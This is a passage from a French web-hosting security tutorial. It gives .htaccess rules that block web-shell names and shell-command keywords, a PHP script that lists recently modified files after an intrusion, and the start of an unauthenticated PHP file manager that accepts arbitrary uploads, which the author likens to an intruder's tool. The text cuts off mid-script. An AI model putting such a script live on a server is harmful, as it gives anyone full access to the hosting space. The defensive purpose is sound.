<span style="color: #008000">RewriteRule</span> .*\.(gif|jpe?g?|jp2|png|svgz?|css|pdf|zip|gz|js|mp3|m4a|mp4|mov|divx|avi|wma?v?|wmp|swf|flv|docx?|xlsx?|pptx?|vbs|rtf|asf?x?|odt|ods|odp|odg|odb|eot|ttf|woff|woff2)$ [NC,F]
</pre></div>
						<p><strong>9-</strong> Si des pirates ont réussi à pénétrer votre site, ils installent un script qui leur permettent de prendre les commandes de votre hébergement. Ici, on bloque la plupart des commandes de ces scripts. À tester avec votre site web, car c'est très puissant et efficace. À la 5e ligne, remplacez “/home/loginftp/” par votre chemin de fichier absolu avant le dossier “www” ou “public_html”. <strong>Cette règle est très efficace mais peut casser votre CMS, blog ou e-commerce.</strong> À utiliser en dernier, puis à tester intensément, et effacez éventuellement la règle qui pose problème.</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### FILTRE CONTRE PHPSHELL.PHP, REMOTEVIEW, C99SHELL ET AUTRES</span>
<span style="color: #008000">RewriteEngine</span> <span style="color: #008000; font-weight: bold">On</span>
<span style="color: #008000">RewriteCond</span> %{REQUEST_URI} .*((php|my)?shell|remview.*|phpremoteview.*|sshphp.*|pcom|nstview.*|c99|r57|webadmin.*|phpget.*|phpwriter.*|fileditor.*|locus7.*|storm7.*)\.(p?s?x?htm?l?|txt|aspx?|cfml?|cgi|pl|php[3-9]{0,1}|jsp?|sql|xml) [NC,OR]
<span style="color: #008000">RewriteCond</span> %{REQUEST_METHOD} (GET|POST) [NC]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)=/home/loginftp/(.*)$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^work_dir=.*$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^command=.*&amp;amp;output.*$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^nts_[a-z0-9_]{0,10}=.*$ [OR]
<span style="color: #408080; font-style: italic">## ATTENTION À CETTE RÈGLE. ELLE PEUT CASSER VOTRE SITE</span>
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)cmd=.*$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^c=(t|setup|codes)$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^act=((about|cmd|selfremove|chbd|trojan|backc|massbrowsersploit|exploits|grablogins|upload.*)|((chmod|f)&amp;amp;f=.*))$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^act=(ls|search|fsbuff|encoder|tools|processes|ftpquickbrute|security|sql|eval|update|feedback|cmd|gofile|mkfile)&amp;amp;d=.*$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^&amp;amp;?c=(l?v?i?&amp;amp;d=|v&amp;amp;fnot=|setup&amp;amp;ref=|l&amp;amp;r=|d&amp;amp;d=|tree&amp;amp;d|t&amp;amp;d=|e&amp;amp;d=|i&amp;amp;d=|codes|md5crack).*$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)([-_a-z]{1,15})=(ls|cd|cat|rm|mv|vim|chmod|chdir|concat|mkdir|rmdir|pwd|clear|whoami|uname|tar|zip|unzip|gzip|gunzip|grep|more|ln|umask|telnet|ssh|ftp|head|tail|which|mkmode|touch|logname|edit_file|search_text|find_text|php_eval|download_file|ftp_file_down|ftp_file_up|ftp_brute|mail_file|mysql|mysql_dump|db_query)([^a-zA-Z0-9].+)*$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(wget|shell_exec|passthru|system|exec|popen|proc_open)(.*)$
<span style="color: #008000">RewriteRule</span> (.*) [F]
</pre></div>
						<p><strong>Ne mettez pas ces règles d'un coup.</strong><br>
						Copiez-en une, puis testez votre CMS, blog ou e-commerce en ajoutant, modifiant un article, ajoutez, effacez un utilisateur, accédez à votre interface d'administration et faites plusieurs choses. Si tout est OK, mettez une autre règle. En cas de problème, regardez l'URL appelée. Il y a peut-être un mot-clé qui est bloqué par le fichier .htaccess. Il faudra effacer ce mot-clé du fichier .htaccess. Vous l'avez compris, ce système filtre l'URL et regarde s'il est conforme à une utilisation normale. Donc, si vous avez un message d'erreur, trouvez le mot-clé qui bloque la requête.<br>
						Il faut adapter ces règles à votre cas, ce n'est pas du simple copier-coller.</p>
						<p>Plus tard, si dans l'utilisation de votre CMS, blog ou e-commerce, vous voyez une erreur 403, alors il est probable qu'une règle du filtrage soit active.</p>
						<p>Enfin, votre CMS, blog ou e-commerce utilise souvent le fichier .htaccess pour y mettre des règles de ré-écriture d'URL plus lisibles (appelé URL rewriting). Mettez les filtres anti-pirates en premier et les règles URL rewriting à la fin. En effet, les filtres s'appliquent du premier au dernier. Placer les filtres anti-pirates après les règles de ré-écriture d'URL de votre CMS, blog ou e-commerce n'apporterait aucun bénéfice (ce n'est pas vrai à 100%, mais il y a des raisons).</p>
						<a id="fichmodif"></a><hr><br>
						<header>
							<h2>Avoir la liste des fichiers modifiés et ajoutés</h2>
						</header>
						<p>Voici un petit script php qui vous permet d'avoir la liste des derniers fichiers créés <strong>ET</strong> modifiés.</p>
						<p>Si vous avez été victime d'un piratage, il vous permettra de savoir quels fichiers ont été ajoutés et ceux qui ont été modifiés par le pirate avec la date et l'heure. Ainsi, en comparant la date de ces fichiers modifiés aux logs, vous saurez si la modification est normale ou pas et vous saurez quand et comment le pirate a frappé.</p>
						<p>Il sert également à comprendre le comportement d'un script ou d'un CMS, blog, wiki et voir quels fichiers ont été manipulés par ce logiciel.</p>
						<p>Copiez le code ci-dessous et créez un fichier texte que vous pourrez appeler par exemple&nbsp;: liste-modif.php<br>
						Mettez ce script dans votre hébergement dans le dossier “www” ou “public_html”, ouvrez-le avec votre navigateur web, donnez le nombre de jours représentant la période à vérifier, puis le nom du dossier à analyser. Le chemin de fichier doit se terminer par / comme par exemple&nbsp;: “/forum/” qui correspondra à “/home/votreloginftp/www/forum/”<br>
						Si vous voulez vérifier tout le contenu du dossier “www” ou “public_html”, cliquez uniquement sur le bouton “Vérifier Fichiers”.</p>
						<p>Attention, si vous avez beaucoup de fichiers et de répertoires, le listage peut prendre trop de temps et le script peut s'interrompre après 30s d'exécution. Si c'est le cas, essayez votre recherche répertoire par répertoire.</p>
						<p>Ce script ne va donner la liste que des dossiers à partir du chemin “/home/votreloginftp/www/” ou “/home/votreloginftp/public_html/” de votre hébergement. Une fois l'opération terminée, supprimez ce fichier pour éviter toute utilisation involontaire.</p>
						<p>Vous pouvez prendre ce fichier PHP ici&nbsp;: <a href="depot/modif.zip">modif.zip (2,1 Ko)</a></p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">Donne la liste des derniers fichiers créés ET modifiés.</span>
<span style="color: #408080; font-style: italic">Très utile en cas de piratage pour savoir quels fichiers sont ajoutés et ceux qui ont été modifiés. Utile pour comprendre le comportement d&#39;un script ou d&#39;un CMS et voir quels fichiers ont été manipulés.</span>

<span style="color: #408080; font-style: italic">Mettez ce script dans votre hébergement, ouvrez-le avec votre navigateur web, donnez le nombre de jours représentant la période à vérifier, puis le nom du dossier à analyser.</span>
<span style="color: #408080; font-style: italic">Ce script ne va donner la liste que des dossiers à partir du chemin /home/votreloginftp/www/ de votre hébergement.</span>

<span style="color: #408080; font-style: italic">Supprimez le fichier après utilisation.</span>

<span style="color: #408080; font-style: italic">Crédits: Les 4/5 du code sont l&#39;oeuvre de Linda MacPhee-Cobb (http://timestocome.com)</span>
<span style="color: #408080; font-style: italic">*/</span>
    <span style="color: #19177C">$go_back</span> <span style="color: #666666">=</span> <span style="color: #666666">0</span>;                       <span style="color: #408080; font-style: italic">/* affiche résultat ou non */</span>
    <span style="color: #19177C">$i</span> <span style="color: #666666">=</span> <span style="color: #666666">0</span>;                                <span style="color: #408080; font-style: italic">/* compteur de boucle */</span>
    <span style="color: #19177C">$dir_count</span> <span style="color: #666666">=</span> <span style="color: #666666">0</span>;                        <span style="color: #408080; font-style: italic">/* initialisation de la boucle */</span>
    <span style="color: #19177C">$date</span> <span style="color: #666666">=</span> <span style="color: #008000">time</span>();                        <span style="color: #408080; font-style: italic">/* date et heure actuelle */</span>
    <span style="color: #19177C">$one_day</span> <span style="color: #666666">=</span> <span style="color: #666666">86400</span>;                    <span style="color: #408080; font-style: italic">/* nombre de secondes pour une journée */</span>
    <span style="color: #19177C">$days</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^0-9]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;jours&quot;</span>]);    <span style="color: #408080; font-style: italic">/* nombre de jours à vérifier */</span>
    <span style="color: #19177C">$path</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^_A-Za-z0-9-\.%\/]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;chemin&quot;</span>]);    <span style="color: #408080; font-style: italic">/* chemin de fichier absolu (avec nettoyage contre piratage) */</span>
    <span style="color: #19177C">$path</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/\.\.\//&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$path</span>);    <span style="color: #408080; font-style: italic">/* on interdit la commande ../ */</span>
    <span style="color: #008000">define</span>(<span style="color: #BA2121">&#39;ABSPATH&#39;</span>, <span style="color: #008000">dirname</span>(<span style="color: #008000; font-weight: bold">__FILE__</span>));
    <span style="color: #19177C">$path</span> <span style="color: #666666">=</span> ABSPATH<span style="color: #666666">.</span><span style="color: #19177C">$path</span>;    <span style="color: #408080; font-style: italic">/* chemin de fichier absolu de votre compte du genre /home/loginftp/www/ ou /home/loginftp/public_html/ etc. */</span>
    <span style="color: #19177C">$directories_to_read</span>[<span style="color: #19177C">$dir_count</span>] <span style="color: #666666">=</span> <span style="color: #19177C">$path</span>;
    
    <span style="color: #408080; font-style: italic">/* Formulaire pour remonter le temps */</span>
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;html&gt;&lt;body&gt;&lt;h3&gt;Contr&amp;ocirc;le des derniers fichiers modifi&amp;eacute;s &lt;br /&gt;dans votre h&amp;eacute;bergement .&lt;/h3&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;form method=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">post</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt;Nombre de jours &amp;agrave; v&amp;eacute;rifier 1-99: &lt;/td&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">text</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">jours</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> maxlength=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">2</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> size=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">2</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt;Nom du r&amp;eacute;pertoire &amp;agrave; contr&amp;ocirc;ler: &lt;/td&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;td&gt;&quot;</span><span style="color: #666666">.</span>ABSPATH<span style="color: #666666">.</span><span style="color: #BA2121">&quot; &lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">text</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">chemin</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> maxlength=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">80</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> size=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">30</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">/</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> &gt; (mettre un / &amp;agrave; la fin)&lt;/td&gt;&lt;/tr&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">submit</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> V&amp;eacute;rifier Fichiers </span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;/form&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span>;
    <span style="color: #408080; font-style: italic">/* Affichage du résultat */</span>
    <span style="color: #19177C">$go_back</span> <span style="color: #666666">=</span> <span style="color: #19177C">$one_day</span> <span style="color: #666666">*</span> <span style="color: #19177C">$days</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;br /&gt; Retour sur les &lt;strong&gt;&quot;</span> <span style="color: #666666">.</span> (<span style="color: #19177C">$go_back</span><span style="color: #666666">/</span><span style="color: #19177C">$one_day</span>) <span style="color: #666666">.</span><span style="color: #BA2121">&quot;&lt;/strong&gt; derniers jours. &lt;br /&gt;&lt;br /&gt;&quot;</span>;

    <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #19177C">$go_back</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span> ){
        <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Nom du Fichier&lt;/th&gt;&lt;th&gt;Date de modification&lt;/th&gt;&lt;/tr&gt;&quot;</span>;
        <span style="color: #19177C">$diff</span> <span style="color: #666666">=</span> <span style="color: #19177C">$date</span> <span style="color: #666666">-</span> <span style="color: #19177C">$go_back</span>;
        
        <span style="color: #008000; font-weight: bold">while</span> ( <span style="color: #19177C">$i</span> <span style="color: #666666">&lt;=</span> <span style="color: #19177C">$dir_count</span> ){
            <span style="color: #19177C">$current_directory</span> <span style="color: #666666">=</span> <span style="color: #19177C">$directories_to_read</span>[<span style="color: #19177C">$i</span>];
        
            <span style="color: #408080; font-style: italic">/* obtenir info fichier */</span>
            <span style="color: #19177C">$read_path</span> <span style="color: #666666">=</span> <span style="color: #008000">opendir</span>( <span style="color: #19177C">$directories_to_read</span>[<span style="color: #19177C">$i</span>] );
            <span style="color: #008000; font-weight: bold">while</span> ( <span style="color: #19177C">$file_name</span> <span style="color: #666666">=</span> <span style="color: #008000">readdir</span>( <span style="color: #19177C">$read_path</span>)){
                <span style="color: #008000; font-weight: bold">if</span> (( <span style="color: #19177C">$file_name</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&#39;.&#39;</span> )<span style="color: #666666">&amp;&amp;</span>( <span style="color: #19177C">$file_name</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&#39;..&#39;</span> )){
                    <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #008000">is_dir</span>( <span style="color: #19177C">$current_directory</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/&quot;</span>  <span style="color: #666666">.</span> <span style="color: #19177C">$file_name</span> ) <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;dir&quot;</span> ){
                        <span style="color: #408080; font-style: italic">/* besoin d&#39;obtenir tous les fichiers d&#39;un répertoire */</span>
                        <span style="color: #19177C">$d_file_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$current_directory</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$file_name</span><span style="color: #BA2121">&quot;</span>;
                        <span style="color: #19177C">$dir_count</span><span style="color: #666666">++</span>;
                        <span style="color: #19177C">$directories_to_read</span>[<span style="color: #19177C">$dir_count</span>] <span style="color: #666666">=</span> <span style="color: #19177C">$d_file_name</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/&quot;</span>;
                    }<span style="color: #008000; font-weight: bold">else</span>{
                        <span style="color: #19177C">$file_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$current_directory</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$file_name</span><span style="color: #BA2121">&quot;</span>;                                
                        <span style="color: #408080; font-style: italic">/* Si temps modifiés plus récent que x jours, affiche, sinon, passe */</span>
                        <span style="color: #008000; font-weight: bold">if</span> ( (<span style="color: #008000">filemtime</span>( <span style="color: #19177C">$file_name</span>)) <span style="color: #666666">&gt;</span> <span style="color: #19177C">$diff</span>  ){
                            <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt; </span><span style="color: #BB6688; font-weight: bold">$file_name</span><span style="color: #BA2121"> &lt;/td&gt;&quot;</span>;
                            <span style="color: #19177C">$date_changed</span> <span style="color: #666666">=</span> <span style="color: #008000">filemtime</span>( <span style="color: #19177C">$file_name</span> );
                            <span style="color: #19177C">$pretty_date</span> <span style="color: #666666">=</span> <span style="color: #008000">date</span>(<span style="color: #BA2121">&quot;d/m/Y H:i:s&quot;</span>, <span style="color: #19177C">$date_changed</span>);
                            <span style="color: #008000; font-weight: bold">print</span>  <span style="color: #BA2121">&quot;&lt;td&gt; ::: </span><span style="color: #BB6688; font-weight: bold">$pretty_date</span><span style="color: #BA2121">&lt;/td&gt;&lt;/tr&gt;&quot;</span> ;
                        }
                    }
                }
            }
            <span style="color: #008000">closedir</span> ( <span style="color: #19177C">$read_path</span> );
            <span style="color: #19177C">$i</span><span style="color: #666666">++</span>;    
        }
            <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;/table&gt;&quot;</span>;    
            <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;br /&gt;Supprimez le fichier après utilisation.&lt;/body&gt;&lt;/html&gt;&quot;</span>;    
    } <span style="color: #408080; font-style: italic">/* if go_back &gt; 0 ) */</span>
<span style="color: #BC7A00">?&gt;</span>
</pre></div>

						<a id="gesfic"></a><hr><br>
						<header>
							<h2>Gestionnaire de fichiers pour gérer son espace web</h2>
						</header>
						<p>Ce gestionnaire de fichiers écrit en PHP permet de manipuler le contenu d'un espace web, comme vous le feriez par FTP. Il permet de créer, lire, effacer, compresser, décompresser, changer les droits, renommer les fichiers et dossiers. Son interface est simpliste mais efficace.</p>
						<p>C'est avec ce genre de script que le pirate modifie votre site quand il parvient à exploiter une faille de sécurité pour réussir à envoyer son fichier dans votre hébergement.</p>
						<p>Copiez le code ci-dessous et créez un fichier texte que vous pourrez appeler par exemple&nbsp;: gesfic.php<br>
						Mettez ce script dans votre hébergement dans le dossier “www” ou “public_html” ou ailleurs, et ouvrez-le avec votre navigateur web.</p>
						<p>Le gestionnaire donne accès en lecture et écriture à tout l'espace de votre hébergement. Une fois l'opération terminée, supprimez ce fichier pour éviter toute utilisation involontaire.</p>
						<p>Vous pouvez prendre ce fichier PHP ici&nbsp;: <a href="depot/gesfic.zip">gesfic.zip (4,4 Ko)</a></p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;height:40em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #408080; font-style: italic">/* ############################# */</span>
<span style="color: #408080; font-style: italic">/* Gestionnaire de fichiers */</span>
<span style="color: #408080; font-style: italic">/* À SUPPRIMER APRÈS UTILISATION */</span>
<span style="color: #408080; font-style: italic">/* ############################# */</span>
<span style="color: #408080; font-style: italic">/* Ajouter, modifier les fichiers et dossiers dans un répertoire */</span>
<span style="color: #408080; font-style: italic">/* ############################# */</span>

<span style="color: #008000">set_time_limit</span>(<span style="color: #666666">0</span>);
<span style="color: #008000">error_reporting</span>(<span style="color: #666666">0</span>);

<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">get_magic_quotes_gpc</span>()) {
	<span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$_POST</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$key</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$value</span>) {
		<span style="color: #19177C">$_POST</span>[<span style="color: #19177C">$key</span>] <span style="color: #666666">=</span> <span style="color: #008000">stripslashes</span>(<span style="color: #19177C">$value</span>);
	}
}
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;!DOCTYPE HTML&gt;</span>
<span style="color: #BA2121">&lt;html&gt;</span>
<span style="color: #BA2121">&lt;head&gt;</span>
<span style="color: #BA2121">&lt;style&gt;</span>
<span style="color: #BA2121">body {font-family: monospace;background-color: #ffffff;}</span>
<span style="color: #BA2121">.petit {font-size:.8em;}</span>
<span style="color: #BA2121">#content tr:hover {background-color: #008580;text-shadow:0px 0px 10px #ffffff;}</span>
<span style="color: #BA2121">#content .first {background-color: #008580;}</span>
<span style="color: #BA2121">#content .first:hover {background-color: #008580;text-shadow:0px 0px 1px #ffffff;}</span>
<span style="color: #BA2121">table {border: 1px #008580 dotted;}</span>
<span style="color: #BA2121">a {color: mediumblue;text-decoration: none;}</span>
<span style="color: #BA2121">a:hover {color: #fff;text-shadow:0px 0px 10px #ffffff;}</span>
<span style="color: #BA2121">input,select,textarea {border: 1px #000000 solid;border-radius:5px;}</span>
<span style="color: #BA2121">.milieu {display: block;margin:0 auto;}</span>
<span style="color: #BA2121">.centre {text-align:center;}</span>
<span style="color: #BA2121">&lt;/style&gt;</span>
<span style="color: #BA2121">&lt;/head&gt;</span>
<span style="color: #BA2121">&lt;body&gt;</span>
<span style="color: #BA2121">&lt;table width=&quot;700&quot; border=&quot;0&quot; cellpadding=&quot;3&quot; cellspacing=&quot;1&quot; align=&quot;center&quot;&gt;</span>
<span style="color: #BA2121">&lt;tr&gt;&lt;td&gt;Chemin de fichiers &gt;&gt;  &#39;</span>;
<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;path&#39;</span>])) {
	<span style="color: #19177C">$path</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_GET</span>[<span style="color: #BA2121">&#39;path&#39;</span>];
}
<span style="color: #008000; font-weight: bold">else</span> {
	<span style="color: #19177C">$path</span> <span style="color: #666666">=</span> <span style="color: #008000">getcwd</span>();
}
<span style="color: #19177C">$path</span> <span style="color: #666666">=</span> <span style="color: #008000">str_replace</span>(<span style="color: #BA2121">&#39;\\&#39;</span>, <span style="color: #BA2121">&#39;/&#39;</span>, <span style="color: #19177C">$path</span>);
<span style="color: #19177C">$paths</span> <span style="color: #666666">=</span> <span style="color: #008000">explode</span>(<span style="color: #BA2121">&#39;/&#39;</span>, <span style="color: #19177C">$path</span>);

<span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$paths</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$id</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$pat</span>) {
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$pat</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;&#39;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$id</span> <span style="color: #666666">==</span> <span style="color: #666666">0</span>) {
		<span style="color: #19177C">$a</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">true</span>;
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;a href=&quot;?path=/&quot;&gt;/&lt;/a&gt;&#39;</span>;
		<span style="color: #008000; font-weight: bold">continue</span>;
	}
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$pat</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;&#39;</span>) <span style="color: #008000; font-weight: bold">continue</span>;
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;a href=&quot;?path=&#39;</span>;
	<span style="color: #008000; font-weight: bold">for</span> (<span style="color: #19177C">$i</span> <span style="color: #666666">=</span> <span style="color: #666666">0</span>;<span style="color: #19177C">$i</span> <span style="color: #666666">&lt;=</span> <span style="color: #19177C">$id</span>;<span style="color: #19177C">$i</span><span style="color: #666666">++</span>) {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$paths[$i]</span><span style="color: #BA2121">&quot;</span>;
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$i</span> <span style="color: #666666">!=</span> <span style="color: #19177C">$id</span>) <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;/&quot;</span>;
	}
	<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&quot;&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$pat</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/a&gt;/&#39;</span>;
}
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#39;</span>;
<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;file&#39;</span>])) {
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">copy</span>(<span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;file&#39;</span>][<span style="color: #BA2121">&#39;tmp_name&#39;</span>], <span style="color: #19177C">$path</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;/&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;file&#39;</span>][<span style="color: #BA2121">&#39;name&#39;</span>])) {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;green&quot;&gt;Téléverser réussi!&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
	<span style="color: #008000; font-weight: bold">else</span> {
		<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;font color=&quot;crimson&quot;&gt;&lt;strong&gt;Téléverser échoué!&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;&#39;</span>;
	}
}
<span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;</span>
<span style="color: #BA2121">Téléverser un fichier &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span>
<span style="color: #BA2121">&lt;input type=&quot;submit&quot; value=&quot;Envoyer&quot;&gt;</span>
<span style="color: #BA2121">&lt;/form&gt;&#39;</span>;

<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;dossier&#39;</span>])) {
	<span style="color: #19177C">$nomDossier</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;dossier&#39;</span>];
	<span style="color: #19177C">$nomDossier</span> <span style="color: #666666">=</span> <span style="color: #008000">str_replace</span>(<span style="color: #BA2121">&#39; &#39;</span>, <span style="color: #BA2121">&#39;_&#39;</span>, <span style="color: #19177C">$nomDossier</span>);
